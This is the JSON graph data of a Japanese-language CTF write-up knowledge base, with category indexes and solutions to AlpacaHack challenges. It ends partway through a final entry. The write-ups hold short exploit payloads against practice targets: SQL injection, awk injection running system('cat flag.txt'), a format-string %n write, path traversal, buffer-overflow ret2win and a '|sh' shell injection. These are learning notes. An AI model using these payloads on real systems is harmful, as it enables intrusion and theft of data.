    <script id="graph-data" type="application/json">{"nodes": [{"id": "relations/pwn.md", "rel_path": "relations/pwn.md", "kind": "relations", "title": "Pwn Relations", "meta": {}, "links": ["insights/pwn.md", "writeup/alphahack/2025-w49/1205_integer-writer.md", "writeup/alphahack/2025-w49/1206_simpleoverflow.md", "writeup/alphahack/2025-w51/1217_login-bonus.md", "writeup/alphahack/2025-w51/1219_alloc-101.md", "writeup/alphahack/2025-w52/1223_rotten-beef.md", "writeup/alphahack/2025-w52/1227_simpleoverwrite.md"], "markdown": "# Pwn Relations\n\nPwn 関連 writeup の index。\n個別 offset や payload は writeup に置き、ここでは exploit primitive ごとに探せるようにする。\n\n## 関連 insights\n\n- [Pwn](../insights/pwn.md)\n\n## 事例一覧\n\n- [Integer Writer](../writeup/alphahack/2025-w49/1205_integer-writer.md): 負 index の OOB write で return address を直接 ret2win に変える。\n- [simpleoverflow](../writeup/alphahack/2025-w49/1206_simpleoverflow.md): 小さい stack overflow で隣接する `is_admin` を書き換える。\n- [login-bonus](../writeup/alphahack/2025-w51/1217_login-bonus.md): 長さ制限なし `scanf` で global の `secret` を上書きし、`strcmp` を通す。\n- [alloc-101](../writeup/alphahack/2025-w51/1219_alloc-101.md): free 後に pointer を NULL 化しない UAF。同サイズ再確保で flag chunk を読む。\n- [Rotten Beef](../writeup/alphahack/2025-w52/1223_rotten-beef.md): format string の `%n` で `key` を `0xbeef` にする。\n- [simpleoverwrite](../writeup/alphahack/2025-w52/1227_simpleoverwrite.md): stack BOF で return address を `win` に向ける。\n\n## 比較観点\n\n- stack overflow: `simpleoverflow`, `simpleoverwrite`\n- OOB write: `Integer Writer`\n- global overwrite: `login-bonus`\n- heap UAF: `alloc-101`\n- format string write: `Rotten Beef`\n", "y": 2094.285714285714, "degree": 13, "displayLabel": "pwn"}, {"id": "relations/rsa.md", "rel_path": "relations/rsa.md", "kind": "relations", "title": "RSA Relations", "meta": {}, "links": ["insights/rsa.md", "writeup/alphahack/2025-w49/1207_size-limit.md", "writeup/alphahack/2025-w50/1208_fully-padded-rsa.md", "writeup/alphahack/2025-w50/1213_safe-prime.md", "writeup/alphahack/2025-w51/1221_rsa-debug.md", "writeup/alphahack/2025-w53/1229_one-p-rsa.md", "writeup/alphahack/2025-w53/1230_rbg.md"], "markdown": "# RSA Relations\n\nRSA 関連 writeup の index。\nここには細かい計算値ではなく、「どの問題がどの型か」「どの insight を見ればよいか」を置く。\n\n## 関連 insights\n\n- [RSA](../insights/rsa.md)\n\n## 事例一覧\n\n- [size-limit](../writeup/alphahack/2025-w49/1207_size-limit.md): `d` leak だけでは終わらず、平文が `N` より大きいので `m + kN` を長さ/prefix で lift する。\n- [Fully Padded RSA](../writeup/alphahack/2025-w50/1208_fully-padded-rsa.md): common modulus で `m^3` を取り、deterministic padding の未知下位 bits を Coppersmith で戻す。\n- [Safe Prime](../writeup/alphahack/2025-w50/1213_safe-prime.md): `q = 2p + 1` の関連素数により、`n = 2p^2 + p` を解いて factorization する。\n- [RSA debug?](../writeup/alphahack/2025-w51/1221_rsa-debug.md): 自作 pow の乗算が加算になっており、`c = 1 + m*e mod N` の線形合同になる。\n- [one-p-rsa](../writeup/alphahack/2025-w53/1229_one-p-rsa.md): modulus が素数1個なので `phi = p - 1` が即分かる。\n- [RBG](../writeup/alphahack/2025-w53/1230_rbg.md): LCG で更新される指数の関係から、同じ base の複数冪を組み合わせて `m` を復元する。\n\n## 比較観点\n\n- 平文サイズの問題: `size-limit`\n- padding の問題: `Fully Padded RSA`\n- 素数生成の問題: `Safe Prime`, `one-p-rsa`\n- 実装ミスの問題: `RSA debug?`\n- 複数暗号文・指数関係の問題: `Fully Padded RSA`, `RBG`\n", "y": 3397.1428571428573, "degree": 13, "displayLabel": "rsa"}, {"id": "relations/rev.md", "rel_path": "relations/rev.md", "kind": "relations", "title": "Rev Relations", "meta": {}, "links": ["insights/rev.md", "writeup/alphahack/2025-w49/1204_leaked-flag-checker.md", "writeup/alphahack/2025-w50/1210_read-assembly.md", "writeup/alphahack/2025-w50/1212_sugoi-flag-checker.md", "writeup/alphahack/2025-w50/1214_power-obfus-royalty.md", "writeup/alphahack/2025-w51/1215_flag-printer-2100.md", "writeup/alphahack/2025-w51/1218_twilight.md", "writeup/alphahack/2025-w52/1226_useful-machine.md", "writeup/alphahack/2025-w52/1228_cha-ll-enge.md"], "markdown": "# Rev Relations\n\nRev 関連 writeup の index。\n「比較点を読む」「変換を逆にする」「solver に落とす」のどれかで探す。\n\n## 関連 insights\n\n- [Rev](../insights/rev.md)\n\n## 事例一覧\n\n- [Leaked Flag Checker](../writeup/alphahack/2025-w49/1204_leaked-flag-checker.md): 小さい checker を angr で探索する。\n- [Read Assembly](../writeup/alphahack/2025-w50/1210_read-assembly.md): AArch64 を C に写して数列計算を読む。\n- [Sugoi Flag Checker](../writeup/alphahack/2025-w50/1212_sugoi-flag-checker.md): `strcmp` 直前の平文 expected を debugger で読む。\n- [power_obfus_royalty](../writeup/alphahack/2025-w50/1214_power-obfus-royalty.md): PowerShell の eval 直前の文字列を剥がす。\n- [Flag Printer 2100](../writeup/alphahack/2025-w51/1215_flag-printer-2100.md): 長い sleep を debugger jump で飛ばす。\n- [Twilight](../writeup/alphahack/2025-w51/1218_twilight.md): 関数ポインタで index ごとに変換が変わる出力列を逆変換する。\n- [Useful Machine](../writeup/alphahack/2025-w52/1226_useful-machine.md): 独自 VM を Z3 BitVec で symbolic execution する。\n- [cha-ll-enge](../writeup/alphahack/2025-w52/1228_cha-ll-enge.md): LLVM IR の key 配列から XOR 条件を解く。\n\n## 比較観点\n\n- 平文比較: `Sugoi Flag Checker`\n- 可逆変換: `Twilight`, `cha-ll-enge`\n- solver/探索: `Leaked Flag Checker`, `Useful Machine`\n- assembly/IR 読解: `Read Assembly`, `cha-ll-enge`\n- 難読化/待ち回避: `power_obfus_royalty`, `Flag Printer 2100`\n", "y": 2745.714285714286, "degree": 17, "displayLabel": "rev"}, {"id": "relations/misc.md", "rel_path": "relations/misc.md", "kind": "relations", "title": "Misc Relations", "meta": {}, "links": ["insights/misc.md", "writeup/alphahack/2025-w49/1201_alpacahack-2100.md", "writeup/alphahack/2025-w50/1209_hit-and-miss.md", "writeup/alphahack/2025-w52/1224_cat3.md", "writeup/alphahack/2025-w53/1231_108.md"], "markdown": "# Misc Relations\n\nMisc 関連 writeup の index。\n観察・oracle・短い構文・メタデータなど、カテゴリ横断の小技を束ねる。\n\n## 関連 insights\n\n- [Misc](../insights/misc.md)\n\n## 事例一覧\n\n- [AlpacaHack 2100](../writeup/alphahack/2025-w49/1201_alpacahack-2100.md): 日付/月の URL を見る welcome 問。\n- [hit-and-miss](../writeup/alphahack/2025-w50/1209_hit-and-miss.md): regex の Hit/Miss oracle で flag を1文字ずつ復元する。\n- [cat3](../writeup/alphahack/2025-w52/1224_cat3.md): 3文字制限の中で `|sh` を使う。\n- [108](../writeup/alphahack/2025-w53/1231_108.md): Cookie に入っている flag を観察する。\n\n## 比較観点\n\n- oracle: `hit-and-miss`\n- short shell payload: `cat3`\n- browser state: `108`\n- calendar/URL observation: `AlpacaHack 2100`\n", "y": 1442.857142857143, "degree": 9, "displayLabel": "misc"}, {"id": "relations/web.md", "rel_path": "relations/web.md", "kind": "relations", "title": "Web Relations", "meta": {}, "links": ["insights/web.md", "writeup/alphahack/2025-w49/1203_emojify.md", "writeup/alphahack/2025-w50/1211_alpaca-bank.md", "writeup/alphahack/2025-w51/1216_cat.md", "writeup/alphahack/2025-w51/1220_omikuji.md", "writeup/alphahack/2025-w52/1222_log-viewer.md", "writeup/alphahack/2025-w52/1225_xmas-login.md"], "markdown": "# Web Relations\n\nWeb 関連 writeup の index。\n入力がどの構文・状態に入ったかで分類する。\n\n## 関連 insights\n\n- [Web](../insights/web.md)\n\n## 事例一覧\n\n- [Emojify](../writeup/alphahack/2025-w49/1203_emojify.md): URL parser/WAF の解釈差で SSRF する。\n- [Alpaca Bank](../writeup/alphahack/2025-w50/1211_alpaca-bank.md): 自己送金の business logic bug で残高を増やす。\n- [cat](../writeup/alphahack/2025-w51/1216_cat.md): `/dev/stdin` で subprocess に渡された `flag.txt` を読む。\n- [omikuji](../writeup/alphahack/2025-w51/1220_omikuji.md): `../flag` の path traversal で結果 HTML に flag を埋める。\n- [Log Viewer](../writeup/alphahack/2025-w52/1222_log-viewer.md): `awk` の regex/program 文脈に注入し、`system()` を呼ぶ。\n- [Xmas Login](../writeup/alphahack/2025-w52/1225_xmas-login.md): password 欄の SQLi で複数 user の flag 断片を取る。\n\n## 比較観点\n\n- parser gap / SSRF: `Emojify`\n- business logic: `Alpaca Bank`\n- file read: `cat`, `omikuji`\n- program injection: `Log Viewer`\n- SQLi: `Xmas Login`\n", "y": 4048.5714285714284, "degree": 13, "displayLabel": "web"}, {"id": "relations/crypto.md", "rel_path": "relations/crypto.md", "kind": "relations", "title": "Crypto Relations", "meta": {}, "links": ["insights/crypto.md", "writeup/alphahack/2025-w49/1202_a-fact-of-ctf.md"], "markdown": "# Crypto Relations\n\nRSA 以外の crypto/encoding 系 writeup の index。\n\n## 関連 insights\n\n- [Crypto](../insights/crypto.md)\n\n## 事例一覧\n\n- [a fact of CTF](../writeup/alphahack/2025-w49/1202_a-fact-of-ctf.md): 文字コードを素数の指数として埋め込む。素因数分解で指数を数え、`chr` に戻す。\n\n## 比較観点\n\n- 素因数指数 encoding: `a fact of CTF`\n", "y": 791.4285714285714, "degree": 3, "displayLabel": "crypto"}, {"id": "writeup/alphahack/2025-w52/1226_useful-machine.md", "rel_path": "writeup/alphahack/2025-w52/1226_useful-machine.md", "kind": "writeup", "title": "Useful Machine", "meta": {"title": "Useful Machine", "category": "rev", "genre": "virtual-machine", "difficulty": "hard", "tags": ["vm", "z3", "bitvector"], "source": "alpacahack:useful-machine", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: Useful Machine\ncategory: rev\ngenre: virtual-machine\ndifficulty: hard\ntags:\n  - vm\n  - z3\n  - bitvector\nsource: alpacahack:useful-machine\nsolved_at: 2026-05-29\n---\n\n# Useful Machine\n\n## 問題の要点\n\n- 独自 VM の bytecode が与えられる。\n- opcode は input, immediate, move, add, mul, xor, not 程度。\n- 最終的に `mem[0] == 0` になる入力を探す。\n\n## 解き方\n\nVM を Z3 の BitVec 上でエミュレートする。\n\n```python\nmem = [z3.BitVecVal(0, 8) for _ in range(256)]\ninp = [z3.BitVec(f\"input_{i}\", 8) for i in range(40)]\n\nif opcode == 0:\n    mem[op1] = inp[input_idx]\nelif opcode == 3:\n    mem[op1] = mem[op1] + mem[op2]\nelif opcode == 5:\n    mem[op1] = mem[op1] ^ mem[op2]\n\ns.add(mem[0] == 0)\n```\n\n入力命令の数を数えると flag 長は 40。\n\n## 知見\n\n- VM rev は、命令セットが小さいなら「逆算」より「シンボリック実行」の方が速いことがある。\n- 8-bit VM は Z3 の `BitVec(8)` と相性がよい。加算・乗算の mod 256 も自然に表現できる。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 4415.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w52/1227_simpleoverwrite.md", "rel_path": "writeup/alphahack/2025-w52/1227_simpleoverwrite.md", "kind": "writeup", "title": "simpleoverwrite", "meta": {"title": "simpleoverwrite", "category": "pwn", "genre": "stack-overflow", "difficulty": "medium", "tags": ["ret2win", "stack-bof", "no-canary"], "source": "alpacahack:simpleoverwrite", "solved_at": "2026-05-29"}, "links": ["insights/pwn.md", "relations/pwn.md"], "markdown": "---\ntitle: simpleoverwrite\ncategory: pwn\ngenre: stack-overflow\ndifficulty: medium\ntags:\n  - ret2win\n  - stack-bof\n  - no-canary\nsource: alpacahack:simpleoverwrite\nsolved_at: 2026-05-29\n---\n\n# simpleoverwrite\n\n## 問題の要点\n\n- `char buf[10]` に対して `read(0, buf, 0x20)`。\n- return address まで overwrite して `win` に飛ばせる。\n\n## 解き方\n\noffset は 18 byte。`win` のアドレスを後ろに置く。\n\n```python\nexe = ELF(\"./chall\")\npayload = b\"A\" * 18 + p64(exe.symbols[\"win\"])\np.send(payload)\n```\n\n## 知見\n\n- 小さい stack BOF は、まず cyclic/pwndbg で return address offset を取る。\n- PIE が無効なら ret2win は固定アドレスでよい。\n\n## 連携する知見\n\n- [Pwn](../../../insights/pwn.md)\n- [Pwn relations](../../../relations/pwn.md)\n", "y": 3845.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w52/1225_xmas-login.md", "rel_path": "writeup/alphahack/2025-w52/1225_xmas-login.md", "kind": "writeup", "title": "Xmas Login", "meta": {"title": "Xmas Login", "category": "web", "genre": "sql-injection", "difficulty": "easy", "tags": ["sqli", "auth-bypass", "length-filter"], "source": "alpacahack:xmas-login", "solved_at": "2026-05-29"}, "links": ["insights/web.md", "relations/web.md"], "markdown": "---\ntitle: Xmas Login\ncategory: web\ngenre: sql-injection\ndifficulty: easy\ntags:\n  - sqli\n  - auth-bypass\n  - length-filter\nsource: alpacahack:xmas-login\nsolved_at: 2026-05-29\n---\n\n# Xmas Login\n\n## 問題の要点\n\n- `alpaca`, `reindeer`, `santa_claus_admin` の3ユーザーそれぞれに flag 断片がある。\n- username 長制限により `santa_claus_admin` を username 欄には入れられない。\n- password 欄で SQLi できる。\n\n## 解き方\n\nusername はダミーにして、password 側で対象 user を指定する。\n\n```text\nUsername: dummy\nPassword: ' OR username = 'alpaca' ;-- -\nPassword: ' OR username = 'reindeer' ;-- -\nPassword: ' OR username = 'santa_claus_admin' ;-- -\n```\n\n3つの応答から flag をつなぐ。\n\n## 知見\n\n- 片方のフォームに長さ制限があっても、もう片方の injectable field から条件を作れる。\n- flag が複数 role に分割される問題では、全 role の取得条件を一覧化する。\n\n## 連携する知見\n\n- [Web](../../../insights/web.md)\n- [Web relations](../../../relations/web.md)\n", "y": 4557.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w52/1224_cat3.md", "rel_path": "writeup/alphahack/2025-w52/1224_cat3.md", "kind": "writeup", "title": "cat3", "meta": {"title": "cat3", "category": "misc", "genre": "shell", "difficulty": "medium", "tags": ["short-input", "shell", "stdin"], "source": "alpacahack:cat3", "solved_at": "2026-05-29"}, "links": ["insights/misc.md", "relations/misc.md"], "markdown": "---\ntitle: cat3\ncategory: misc\ngenre: shell\ndifficulty: medium\ntags:\n  - short-input\n  - shell\n  - stdin\nsource: alpacahack:cat3\nsolved_at: 2026-05-29\n---\n\n# cat3\n\n## 問題の要点\n\n- `cat` コマンドの引数として入力できるが、3文字制限がある。\n- shell を経由しているため、短い shell 構文が使える。\n\n## 解き方\n\n`|sh` の3文字を入れると、前段の出力を shell に流せる。\n\n```text\n|sh\n```\n\n## 知見\n\n- 短い入力制限では「単体で完結する payload」ではなく、shell の制御文字や既存 stdin/stdout を利用する。\n- `|sh`, `sh`, `$0`, `*`, `?`, `<` など、短い shell gadget を候補にする。\n\n## 連携する知見\n\n- [Misc](../../../insights/misc.md)\n- [Misc relations](../../../relations/misc.md)\n", "y": 1137.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w52/1228_cha-ll-enge.md", "rel_path": "writeup/alphahack/2025-w52/1228_cha-ll-enge.md", "kind": "writeup", "title": "cha-ll-enge", "meta": {"title": "cha-ll-enge", "category": "rev", "genre": "llvm-ir", "difficulty": "medium", "tags": ["llvm-ir", "xor", "static-data"], "source": "alpacahack:cha-ll-enge", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: cha-ll-enge\ncategory: rev\ngenre: llvm-ir\ndifficulty: medium\ntags:\n  - llvm-ir\n  - xor\n  - static-data\nsource: alpacahack:cha-ll-enge\nsolved_at: 2026-05-29\n---\n\n# cha-ll-enge\n\n## 問題の要点\n\n- ELF ではなく LLVM IR が配布される。\n- `@__const.main.key` に 50 個の整数配列がある。\n- 入力長は 49。各位置で `(input[i] ^ key[i]) ^ key[i+1] == 0` を見る。\n\n## 解き方\n\n式を変形すると `input[i] = key[i] ^ key[i+1]`。\n\n```python\nflag = \"\".join(chr(keys[i] ^ keys[i+1]) for i in range(49))\n```\n\n## 知見\n\n- LLVM IR は `load/store/getelementptr/br/icmp` を追えば C の配列アクセスと if に戻せる。\n- XOR checker は「比較式が 0 になる条件」を代数的に解くと静的に戻せる。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 1280.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w52/1222_log-viewer.md", "rel_path": "writeup/alphahack/2025-w52/1222_log-viewer.md", "kind": "writeup", "title": "Log Viewer", "meta": {"title": "Log Viewer", "category": "web", "genre": "command-injection", "difficulty": "medium", "tags": ["awk-injection", "rce", "regex-context"], "source": "alpacahack:log-viewer", "solved_at": "2026-05-29"}, "links": ["insights/web.md", "relations/web.md"], "markdown": "---\ntitle: Log Viewer\ncategory: web\ngenre: command-injection\ndifficulty: medium\ntags:\n  - awk-injection\n  - rce\n  - regex-context\nsource: alpacahack:log-viewer\nsolved_at: 2026-05-29\n---\n\n# Log Viewer\n\n## 問題の要点\n\n- 入力 query が `awk \"/{query}/\" info.log` の regex 部分に入る。\n- shell injection ではなく、awk program injection として考える。\n- awk には `system()` がある。\n\n## 解き方\n\n前後に付く `/` を閉じて、`BEGIN` action でコマンドを実行する。\n\n```text\n/{}; BEGIN { system(\"cat flag.txt\") }; /dummy\n```\n\n## 知見\n\n- subprocess に list で渡していても、呼び出し先言語の構文にユーザー入力を埋めれば injection になる。\n- grep/sed/awk/SQL/テンプレートなど、shell 以外の「小言語」は全部 injection surface。\n\n## 連携する知見\n\n- [Web](../../../insights/web.md)\n- [Web relations](../../../relations/web.md)\n", "y": 2277.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w52/1223_rotten-beef.md", "rel_path": "writeup/alphahack/2025-w52/1223_rotten-beef.md", "kind": "writeup", "title": "Rotten Beef", "meta": {"title": "Rotten Beef", "category": "pwn", "genre": "format-string", "difficulty": "medium", "tags": ["fsb", "arbitrary-write", "percent-n"], "source": "alpacahack:rotten-beef", "solved_at": "2026-05-29"}, "links": ["insights/pwn.md", "relations/pwn.md"], "markdown": "---\ntitle: Rotten Beef\ncategory: pwn\ngenre: format-string\ndifficulty: medium\ntags:\n  - fsb\n  - arbitrary-write\n  - percent-n\nsource: alpacahack:rotten-beef\nsolved_at: 2026-05-29\n---\n\n# Rotten Beef\n\n## 問題の要点\n\n- 入力は `scanf(\"%11s\", buffer)` で 11 byte まで。\n- その後 `printf(buffer, &key, &dummy)` として入力が format string になる。\n- `key = 0xdead` を `0xbeef` に変えればよい。\n\n## 解き方\n\n第1引数に `&key` が渡っているので、`%1$n` でこれまでに出力した文字数を書き込める。\n\n```text\n%48879c%1$n\n```\n\n`0xbeef = 48879`。\n\n## 知見\n\n- 入力長が短くても、`printf(user_input, ptr...)` のように都合のよい引数があると `%n` が刺さる。\n- format string は leak だけでなく write primitive として見る。\n\n## 連携する知見\n\n- [Pwn](../../../insights/pwn.md)\n- [Pwn relations](../../../relations/pwn.md)\n", "y": 3275.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1221_rsa-debug.md", "rel_path": "writeup/alphahack/2025-w51/1221_rsa-debug.md", "kind": "writeup", "title": "RSA debug?", "meta": {"title": "RSA debug?", "category": "crypto", "genre": "rsa", "difficulty": "medium", "tags": ["broken-pow", "linearization", "modular-inverse"], "source": "alpacahack:rsa-debug", "solved_at": "2026-05-29"}, "links": ["insights/rsa.md", "relations/rsa.md"], "markdown": "---\ntitle: RSA debug?\ncategory: crypto\ngenre: rsa\ndifficulty: medium\ntags:\n  - broken-pow\n  - linearization\n  - modular-inverse\nsource: alpacahack:rsa-debug\nsolved_at: 2026-05-29\n---\n\n# RSA debug?\n\n## 問題の要点\n\n- `my_pow(a, n, m)` が通常の modular exponentiation に見える。\n- しかし乗算すべき箇所が加算になっている。\n\n```python\nif n % 2 != 0:\n    result = (result + a) % m\na = (a + a) % m\n```\n\n## 解き方\n\nこの関数は `a^n mod m` ではなく、double-and-add により `1 + a*n mod m` を計算する。\nしたがって暗号文は `c = 1 + flag * e mod N`。\n\n```python\nm = (c - 1) * inverse(e, N) % N\nprint(long_to_bytes(m))\n```\n\n## 知見\n\n- 暗号コードは名前を信用せず、演算子を見る。\n- `pow` 実装の乗算が加算に変わると、指数計算ではなく線形計算になる。\n\n## 連携する知見\n\n- [RSA](../../../insights/rsa.md)\n- [RSA relations](../../../relations/rsa.md)\n", "y": 3417.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1218_twilight.md", "rel_path": "writeup/alphahack/2025-w51/1218_twilight.md", "kind": "writeup", "title": "Twilight", "meta": {"title": "Twilight", "category": "rev", "genre": "flag-transform", "difficulty": "medium", "tags": ["function-pointer", "inverse-transform", "index-dependent"], "source": "alpacahack:twilight", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: Twilight\ncategory: rev\ngenre: flag-transform\ndifficulty: medium\ntags:\n  - function-pointer\n  - inverse-transform\n  - index-dependent\nsource: alpacahack:twilight\nsolved_at: 2026-05-29\n---\n\n# Twilight\n\n## 問題の要点\n\n- 入力 flag の各文字に対して、`i % 2` で関数ポインタを切り替える。\n- 偶数/奇数で `ch + i` と `ch ^ i` のような変換をして、出力列と比較する。\n\n## 解き方\n\nデコンパイルして関数 `a`, `b` の意味を読む。\n\n```c\nint a(int ch, int i) { return ch + i; }\nint b(int ch, int i) { return ch ^ i; }\n```\n\n出力値 `out[i]` から逆変換する。\n\n```python\nif i % 2 == 0:\n    ch = out[i] - i\nelse:\n    ch = out[i] ^ i\n```\n\n## 得られた flag\n\n```text\nAlpaca{AlpacaHack_in_Wonderland}\n```\n\n## 知見\n\n- 関数ポインタを使っていても、呼び出し先の候補が少なければ「どの index でどの関数か」を表にする。\n- `+`, `^` のような可逆な1文字変換は、出力列から直接戻せる。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 4272.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1220_omikuji.md", "rel_path": "writeup/alphahack/2025-w51/1220_omikuji.md", "kind": "writeup", "title": "omikuji", "meta": {"title": "omikuji", "category": "web", "genre": "path-traversal", "difficulty": "medium", "tags": ["arbitrary-file-read", "path-traversal", "file-content-template"], "source": "alpacahack:omikuji", "solved_at": "2026-05-29"}, "links": ["insights/web.md", "relations/web.md"], "markdown": "---\ntitle: omikuji\ncategory: web\ngenre: path-traversal\ndifficulty: medium\ntags:\n  - arbitrary-file-read\n  - path-traversal\n  - file-content-template\nsource: alpacahack:omikuji\nsolved_at: 2026-05-29\n---\n\n# omikuji\n\n## 問題の要点\n\n- POST body の `type` からコンテンツを取り、結果 HTML に埋め込む。\n- `getResultContent(type)` がファイルパスとして `type` を扱う。\n- `../flag` のような traversal が通る。\n\n## 解き方\n\n```bash\ncurl \"$BASE/save\" \\\n  -H 'Content-Type: text/plain' \\\n  --data-raw '../flag'\n```\n\n返ってきた result HTML に flag の内容が入る。\n\n## 知見\n\n- テンプレート出力先がランダムでも、埋め込む content の取得元が path traversal なら読み出せる。\n- ファイル名として受け取る値は allowlist に寄せる。denylist だと `../`, symlink, URL decode で崩れやすい。\n\n## 連携する知見\n\n- [Web](../../../insights/web.md)\n- [Web relations](../../../relations/web.md)\n", "y": 2562.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1219_alloc-101.md", "rel_path": "writeup/alphahack/2025-w51/1219_alloc-101.md", "kind": "writeup", "title": "alloc-101", "meta": {"title": "alloc-101", "category": "pwn", "genre": "heap", "difficulty": "hard", "tags": ["use-after-free", "dangling-pointer", "heap-reuse"], "source": "alpacahack:alloc-101", "solved_at": "2026-05-29"}, "links": ["insights/pwn.md", "relations/pwn.md"], "markdown": "---\ntitle: alloc-101\ncategory: pwn\ngenre: heap\ndifficulty: hard\ntags:\n  - use-after-free\n  - dangling-pointer\n  - heap-reuse\nsource: alpacahack:alloc-101\nsolved_at: 2026-05-29\n---\n\n# alloc-101\n\n## 問題の要点\n\n- `free(item)` 後に `item = NULL` されない。\n- その後、flag 用の allocation を同サイズで行うと、解放済み `item` と同じ chunk が再利用される。\n- `read item` が dangling pointer 経由で flag chunk を読む。\n\n## 解き方\n\n1. flag ファイルと同じサイズで item を allocate。\n2. item を free。\n3. flag を allocate。\n4. item を read すると同じアドレスの flag 内容が出る。\n\n## 知見\n\n- free 後にポインタを残すと Use-After-Free になる。\n- tcache/fastbin の基本問題では「同じサイズを再確保して同じ chunk を取る」が第一候補。\n\n## 連携する知見\n\n- [Pwn](../../../insights/pwn.md)\n- [Pwn relations](../../../relations/pwn.md)\n", "y": 567.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1217_login-bonus.md", "rel_path": "writeup/alphahack/2025-w51/1217_login-bonus.md", "kind": "writeup", "title": "login-bonus", "meta": {"title": "login-bonus", "category": "pwn", "genre": "global-overwrite", "difficulty": "medium", "tags": ["scanf-overflow", "global-buffer", "strcmp"], "source": "alpacahack:login-bonus", "solved_at": "2026-05-29"}, "links": ["insights/pwn.md", "relations/pwn.md"], "markdown": "---\ntitle: login-bonus\ncategory: pwn\ngenre: global-overwrite\ndifficulty: medium\ntags:\n  - scanf-overflow\n  - global-buffer\n  - strcmp\nsource: alpacahack:login-bonus\nsolved_at: 2026-05-29\n---\n\n# login-bonus\n\n## 問題の要点\n\n- `password` と `secret` が隣接する 32 byte のグローバル変数。\n- `secret` は起動ごとにランダムだが、`password` 入力の `scanf` に長さ制限がない。\n- `strcmp(password, secret)` が通ればよい。\n\n## 解き方\n\noverflow で `secret` 側を `password` と同じ値にする。ヌルバイトで両方を空文字扱いにできるなら、32個程度の `\\0` で比較が通る。\n\n```bash\n(printf '\\0%.0s' {1..32}; cat) | ./login\n```\n\n## 知見\n\n- secret がランダムでも、secret 自体を書き換えられるなら leak は不要。\n- `strcmp` は最初の NUL で終わるため、NUL 注入・NUL overwrite は認証バイパスになりやすい。\n\n## 連携する知見\n\n- [Pwn](../../../insights/pwn.md)\n- [Pwn relations](../../../relations/pwn.md)\n", "y": 2420.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1215_flag-printer-2100.md", "rel_path": "writeup/alphahack/2025-w51/1215_flag-printer-2100.md", "kind": "writeup", "title": "Flag Printer 2100", "meta": {"title": "Flag Printer 2100", "category": "rev", "genre": "anti-wait", "difficulty": "medium", "tags": ["sleep-skip", "debugger", "control-flow"], "source": "alpacahack:flag-printer-2100", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: Flag Printer 2100\ncategory: rev\ngenre: anti-wait\ndifficulty: medium\ntags:\n  - sleep-skip\n  - debugger\n  - control-flow\nsource: alpacahack:flag-printer-2100\nsolved_at: 2026-05-29\n---\n\n# Flag Printer 2100\n\n## 問題の要点\n\n- flag を出す前に長い `sleep` が入る。\n- バイナリの主処理自体は難しくなく、待ち時間を飛ばせばよい。\n\n## 解き方\n\n`gdb` で実行し、`sleep` 中に中断して戻り先へ jump する。\n\n```gdb\nrun\n# sleep 中に Ctrl-Z / interrupt\nbt\njump *main_after_sleep\n```\n\n## 知見\n\n- Rev 問題で時間待ちが本質でない場合、パッチ、LD_PRELOAD、デバッガ jump のどれかで回避できる。\n- `sleep`, `nanosleep`, `clock_nanosleep` が stack trace に見えたら、呼び出し元の次命令へ飛ばす。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 1565.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w51/1216_cat.md", "rel_path": "writeup/alphahack/2025-w51/1216_cat.md", "kind": "writeup", "title": "cat", "meta": {"title": "cat", "category": "web", "genre": "file-read", "difficulty": "medium", "tags": ["stdin", "dev-stdin", "filter-bypass"], "source": "alpacahack:cat", "solved_at": "2026-05-29"}, "links": ["insights/web.md", "relations/web.md"], "markdown": "---\ntitle: cat\ncategory: web\ngenre: file-read\ndifficulty: medium\ntags:\n  - stdin\n  - dev-stdin\n  - filter-bypass\nsource: alpacahack:cat\nsolved_at: 2026-05-29\n---\n\n# cat\n\n## 問題の要点\n\n- `/cat?file=...` で指定したファイルを `cat` する。\n- `file` に `flag` が含まれると拒否される。\n- しかし `subprocess.run(..., stdin=open(\"flag.txt\"))` で flag が標準入力に渡されている。\n\n## 解き方\n\nLinux の `/dev/stdin` を指定すると、`cat` は標準入力として渡された `flag.txt` を読む。\n\n```text\n/cat?file=/dev/stdin\n```\n\n## 知見\n\n- ファイル名フィルタをしていても、`/dev/stdin`, `/proc/self/fd/*`, symlink, path traversal で別名参照できることがある。\n- subprocess に渡した `stdin` は、呼び出し先から通常のファイルディスクリプタとして見える。\n\n## 連携する知見\n\n- [Web](../../../insights/web.md)\n- [Web relations](../../../relations/web.md)\n", "y": 995.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w53/1229_one-p-rsa.md", "rel_path": "writeup/alphahack/2025-w53/1229_one-p-rsa.md", "kind": "writeup", "title": "one-p-rsa", "meta": {"title": "one-p-rsa", "category": "crypto", "genre": "rsa", "difficulty": "easy", "tags": ["one-prime-rsa", "fermat", "phi"], "source": "alpacahack:one-p-rsa", "solved_at": "2026-05-29"}, "links": ["insights/rsa.md", "relations/rsa.md"], "markdown": "---\ntitle: 